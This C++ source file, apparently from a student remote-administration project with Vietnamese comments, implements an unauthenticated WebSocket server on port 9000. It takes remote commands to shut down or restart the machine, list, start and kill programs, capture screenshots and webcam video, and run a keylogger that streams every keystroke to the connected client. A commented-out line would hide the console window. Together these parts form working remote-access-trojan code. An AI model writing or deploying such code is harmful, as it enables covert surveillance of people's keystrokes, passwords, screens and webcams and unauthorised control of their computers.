#define ASIO_STANDALONE
#define _WEBSOCKETPP_CPP11_THREAD_
#define ASIO_HAS_STD_TYPE_TRAITS 1
#define ASIO_HAS_STD_SHARED_PTR 1
#define ASIO_HAS_STD_FUNCTION 1
#define ASIO_HAS_STD_SYSTEM_ERROR 1
#define ASIO_HAS_STD_ARRAY 1
#define ASIO_HAS_STD_CHRONO 1
#define ASIO_HAS_STD_ADDRESSOF 1
#define ASIO_HAS_STD_ATOMIC 1

#define ASIO_STANDALONE
#define _WEBSOCKETPP_CPP11_THREAD_
#define _WEBSOCKETPP_NO_EXCEPTIONS_
#define _WEBSOCKETPP_CPP11_TYPE_TRAITS_

#include <websocketpp/config/asio_no_tls.hpp>
#include <websocketpp/server.hpp>

#include "../Application/ListApp.cpp"  // Chèn hàm liệt kê ứng dụng đã cài đặt
#include "../Application/StartApp.cpp" // Chèn hàm khởi động ứng dụng
#include "../Application/StopApp.cpp"  // Chèn hàm tắt ứng dụng
#include "../Process/Process.cpp"    // Chèn hàm liệt kê tiến trình đang chạy
#include "../Process/StopProc.cpp" // Chèn hàm tắt tiến trình theo PID
#include "../Process/StartProcName.cpp" // Chèn hàm khởi động tiến trình theo tên

#include "../Screen Shot/ScreenShot.cpp" // Chèn hàm chụp màn hình

#include "../Webcam/Webcam.cpp" // Chèn hàm chụp ảnh từ webcam
#include "../KeyLog/KeyLog.cpp" // Chèn hàm keylog

#include <iostream>
#include <string>
#include <future>
#include <chrono>
#include <vector>

bool keyLogFlag = false;

typedef websocketpp::server<websocketpp::config::asio> server;

void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr msg, std::vector<std::future<void>> &f) {
    std::string received = msg->get_payload();
    std::cout << "Received: " << received << std::endl;
    
    if (received == "shutdown") {
		std::cout << "Shutting down..." << std::endl;
        system("shutdown /s /f /t 0");
    }
    else if (received == "restart") {
		std::cout << "Restarting..." << std::endl;
        system("shutdown /r /f /t 0");
    }
    else if (received == "list_apps") {
        // Gọi hàm liệt kê ứng dụng và gửi kết quả về client
        std::string app_list; // Giả sử hàm này trả về danh sách ứng dụng đã cài đặt
        f.push_back(std::async(std::launch::async, ListApplication, std::ref(app_list)));
        f.back().wait();
        s->send(hdl, app_list, msg->get_opcode());
        std::cout << "Sent app list." << std::endl;
    }

    else if (received == "list_processes") {
        // Gọi hàm liệt kê tiến trình và gửi kết quả về client
        std::string process_list; // Giả sử hàm này trả về danh sách tiến trình đang chạy
        f.push_back(std::async(std::launch::async, ListRunningProcesses, std::ref(process_list)));
        f.back().wait();
		s->send(hdl, process_list, msg->get_opcode());
        std::cout << "Sent process list." << std::endl;
    }
    
    else if (received.rfind("start_app:", 0) == 0) {
        std::string app_to_start = received.substr(10); // Lấy tên ứng dụng sau "start_app:"
        bool flag = false;
        f.push_back(std::async(std::launch::async, StartApplication, std::ref(app_to_start), std::ref(flag)));
        f.back().wait();
        if (!flag) {
            std::cerr << "Failed to start application: " << app_to_start << std::endl;
            s->send(hdl, "Failed to start application: " + app_to_start, msg->get_opcode());
            return;
        } 
        s->send(hdl, "Starting application: " + app_to_start, msg->get_opcode());
    }

    else if (received.rfind("stop_app:", 0) == 0) {
        std::string app_to_stop = received.substr(9); // Lấy tên ứng dụng sau "stop_app:"
        bool flag = false;
        f.push_back(std::async(std::launch::async, StopApplication, std::ref(app_to_stop), std::ref(flag)));
        f.back().wait();
        if (!flag) {
            std::cout << "Failed to stop application: " << app_to_stop << std::endl;
            s->send(hdl, "Failed to stop application: " + app_to_stop, msg->get_opcode());
            return;
        } 
        s->send(hdl, "Stopping application: " + app_to_stop, msg->get_opcode());
    }

    else if (received.rfind("stop_process:", 0) == 0) {
        std::string pid_str = received.substr(13); // Lấy PID sau "stop_process:"
        DWORD pid = std::stoul(pid_str);
        if (!StopProcessById(pid)) {
            std::cout << "Failed to stop process with PID: " << pid << std::endl;
            s->send(hdl, "Failed to stop process with PID: " + pid_str, msg->get_opcode());
            return;
        } 
        s->send(hdl, "Stopped process with PID: " + pid_str, msg->get_opcode());
    }

    else if (received.rfind("stop_proc_name:", 0) == 0) {
        std::string proc_name = received.substr(15); // Lấy tên tiến trình sau "stop_proc_name:"
        bool flag = false;
        f.push_back(std::async(std::launch::async, StopApplication, std::ref(proc_name), std::ref(flag)));
        f.back().wait();
        if (!flag) {
            std::cout << "Failed to stop process: " << proc_name << std::endl;
            s->send(hdl, "Failed to stop process: " + proc_name, msg->get_opcode());
            return;
        } 
		s->send(hdl, "Stopped process: " + proc_name, msg->get_opcode());
    }

    else if (received.rfind("start_proc_name:", 0) == 0) {
        std::string proc_name = received.substr(16); // Lấy tên tiến trình sau "start_proc_name:"
        bool flag = false;
		DWORD pid = 0;
        f.push_back(std::async(std::launch::async, StartProcName, std::ref(proc_name), std::ref(flag), std::ref(pid)));
        f.back().wait();
        if (!flag) {
            std::cerr << "Failed to start process: " << proc_name << std::endl;
            s->send(hdl, "Failed to start process: " + proc_name, msg->get_opcode());
            return;
        } 
        s->send(hdl, "Starting process: " + proc_name + ".exe with PID: " + std::to_string(pid), msg->get_opcode());
	}

    else if (received == "screenshot") {
        // 1. Chụp màn hình và lưu vào file
        auto fakeFunction = [s, hdl, received, msg](){
            TakeScreenshot(); // Giả định thành công
    
            const std::string filename = "screenshot.bmp";
            std::ifstream file(filename, std::ios::binary | std::ios::ate); // Thêm std::ios::ate để lấy kích thước file dễ hơn
            if (!file.is_open()) {
                // Xử lý lỗi nếu không mở được file
                // Gửi thông báo lỗi qua websocket (tùy chọn)
                std::cerr << "Lỗi: Không thể mở file ảnh chụp màn hình.\n";
                return; // Dừng xử lý
            }
            
            // Lấy kích thước file
            std::streamsize size = file.tellg();
            file.seekg(0, std::ios::beg);
            
            // 2. Đọc file vào buffer
            std::vector<char> buffer(size);
            if (file.read(buffer.data(), size)) {
                // 3. Gửi nhị phân
                s->send(hdl, received, msg->get_opcode()); // Gửi thông báo trước khi gửi file
                s->send(hdl, buffer.data(), buffer.size(), websocketpp::frame::opcode::binary);
                std::cout << "Sent " << size << " bytes of screenshot.\n";
            } 
            else {
                std::cerr << "Failed to read screenshot file.\n";
            }
            
            // 4. Dọn dẹp (Giải phóng file)
            file.close(); // Đảm bảo file được đóng trước khi xóa
            if (std::remove(filename.c_str()) == 0) {
                std::cout << "Deleted temporary screenshot file.\n";
            } 
            else {
                std::cerr << "Warning: Could not delete temporary screenshot file.\n";
            }
        };
        f.push_back(std::async(std::launch::async, fakeFunction));
    }

    else if (received == "webcam") {
        auto fakeFunction = [s, hdl, received, msg](){
            CaptureWebcamImage(); // Quay webcam và lưu file thành "webcam.mp4"
    
            // 1. Tên file phải khớp với tên file output trong hàm quay phim
            const std::string filename = "webcam.mp4"; 
    
            // Mở file ở chế độ Binary + At End (để lấy size)
            std::ifstream file(filename, std::ios::binary | std::ios::ate);
            
            if (!file.is_open()) {
                std::cerr << "Error! File not found: " << filename << "\n";
                return;
            }
    
            // Lấy kích thước file
            std::streamsize size = file.tellg();
            file.seekg(0, std::ios::beg); // Quay lại đầu file để đọc
    
            // Kiểm tra dung lượng (10s video ~ vài MB, vector chịu được)
            // Nếu file > 100MB thì nên chia nhỏ (chunking), nhưng 10s thì load hết vào RAM ok.
            std::vector<char> buffer(size);
    
            // 2. Đọc toàn bộ file vào buffer
            if (file.read(buffer.data(), size)) {
                std::cout << "Sending MP4 file (" << size << " bytes) over WebSocket...\n";
                
                // 3. Gửi nhị phân (Opcode::binary)
                try {
                    s->send(hdl, received, msg->get_opcode()); // Gửi thông báo trước khi gửi file
                    s->send(hdl, buffer.data(), buffer.size(), websocketpp::frame::opcode::binary);
                    std::cout << "Sent successfully!\n";
                } catch (const websocketpp::exception & e) {
                    std::cerr << "Error sending WebSocket: " << e.what() << "\n";
                }
            } 
            else {
                std::cerr << "Error: Could not read file data.\n";
            }
    
            // 4. Dọn dẹp
            file.close(); // Đảm bảo file được đóng trước khi xóa
            if (std::remove(filename.c_str()) == 0) {
                std::cout << "Deleted temporary screenshot file.\n";
            } 
            else {
                std::cerr << "Warning: Could not delete temporary screenshot file.\n";
            }
        };
        f.push_back(std::async(std::launch::async, fakeFunction));
    }

    else if (received == "start_keylog" && !keyLogFlag) {
        // Bắt đầu keylogging
        s->send(hdl, "Keylogging started.", msg->get_opcode());
        keyLogFlag = true;
        auto fakeFunction = [s, hdl, received, msg](){
            //ShowWindow(GetConsoleWindow(), SW_HIDE);
            while (keyLogFlag) {
                Sleep(10);
                std::string output;
                for (int KEY = 8; KEY <= 255; KEY++){
                    if (GetAsyncKeyState(KEY) == -32767) {
                        if (SpecialKeys(KEY, output) == true) {
                            s->send(hdl, "Keylog", msg->get_opcode());
                            s->send(hdl, output, msg->get_opcode());
                        }
                        else if (KEY >= 65 && KEY <= 90) { // Chữ cái A-Z
                            bool shift_pressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;
                            bool caps_active = GetKeyState(VK_CAPITAL) & 0x0001;
                            bool is_uppercase = shift_pressed ^ caps_active;
                            
                            if (is_uppercase) {
                                s->send(hdl, "Keylog", msg->get_opcode());
                                s->send(hdl, std::string(1, char(KEY)), msg->get_opcode());
                            } 
                            else {
                                s->send(hdl, "Keylog", msg->get_opcode());
                                s->send(hdl, std::string(1, char(KEY + 32)), msg->get_opcode());
                            }
                            
                        } 
                        // 3. Xử lý các ký tự khác (số 0-9, dấu chấm câu, v.v.)
                        else if (KEY >= 48 && KEY <= 57) { // Số 0-9
                            s->send(hdl, "Keylog", msg->get_opcode());
                            s->send(hdl, std::string(1, char(KEY)), msg->get_opcode());
                        }
                    }
                }
            }
        };
        f.push_back(std::async(std::launch::async, fakeFunction));
    }

    else if (received == "stop_keylog" && keyLogFlag) {
        // Dừng keylogging
        keyLogFlag = false;
        s->send(hdl, "Keylogging stopped.", msg->get_opcode());
    }

    else {
        s->send(hdl, "Unknown command: " + received, msg->get_opcode());
    }
}

int main() {

    //----> COMPILE = 
    // g++ -std=c++17 -I./ -I./asio/include serverComNet.cpp -o serverComNet.exe -lmswsock  -lws2_32 -lgdi32 -luser32 -lmfplat -lmf -lmfreadwrite -lmfuuid -lshlwapi -lole32 -loleaut32 -static-libgcc -static-libstdc++ "-Wl,-Bstatic" -lstdc++ -lpthread "-Wl,-Bdynamic"
    
    server s;
    std::vector<std::future<void>> f; // code đa luồng

    try {
        // comment 2 dong nay roi chay List App se ra chu TRUNG QUOC
        s.clear_access_channels(websocketpp::log::alevel::all);
        s.clear_error_channels(websocketpp::log::elevel::all);

        s.init_asio();
        s.set_message_handler(std::bind(&on_message, &s, std::placeholders::_1, std::placeholders::_2, std::ref(f)));

        s.listen(9000);          // Cổng server
        s.start_accept();

        std::cout << "Server running at ws://localhost:9000\n";
        s.run();  // chạy event loop
    } 
    catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
    }
}
